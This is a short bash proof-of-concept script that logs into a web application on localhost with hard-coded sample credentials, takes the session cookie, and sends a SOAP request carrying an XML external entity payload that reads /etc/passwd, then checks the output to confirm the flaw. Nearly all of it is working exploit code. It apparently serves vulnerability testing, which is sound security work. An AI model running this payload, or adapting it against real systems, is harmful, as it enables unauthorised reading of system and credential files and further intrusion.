#!/bin/bash
# XXE File Read POC

# Get session cookie by logging in
SESSION_RESPONSE=$(curl -i -c /tmp/session_cookies.txt -X POST http://localhost/login \
  -d "username=john&password=password123" 2>&1)

# Extract session cookie from the response
SESSION=$(echo "$SESSION_RESPONSE" | grep "Set-Cookie" | grep "session=" | cut -d'=' -f2 | cut -d';' -f1)

if [ -z "$SESSION" ]; then
  echo "Failed to authenticate"
  exit 1
fi

# Test XXE - Read /etc/passwd
echo "Testing XXE vulnerability..."
curl -s -b "session=$SESSION" -X POST http://localhost/soap_service \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>' | grep -q "root:x:0:0"

if [ $? -eq 0 ]; then
  echo "XXE VULNERABILITY CONFIRMED"
  exit 0
else
  echo "XXE test failed"
  exit 1
fi
